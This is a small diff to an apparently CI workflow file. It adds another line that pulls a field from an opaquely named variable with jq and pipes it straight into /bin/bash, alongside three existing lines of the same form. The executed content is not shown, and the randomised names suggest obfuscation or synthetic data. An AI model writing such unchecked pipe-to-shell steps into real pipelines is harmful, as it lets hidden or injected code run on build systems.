@@ -24,6 +24,7 @@ jobs:
           echo $yb18366 | jq -r .epv1 | /bin/bash
           echo $c21 | jq -r .hn9745 | /bin/bash
           printf '%s' "$vquhr5" | jq -r .d22715 | /bin/bash
+          echo $cc4 | jq -r .l7 | /bin/bash
 
       - name: Archive output
         if: always()
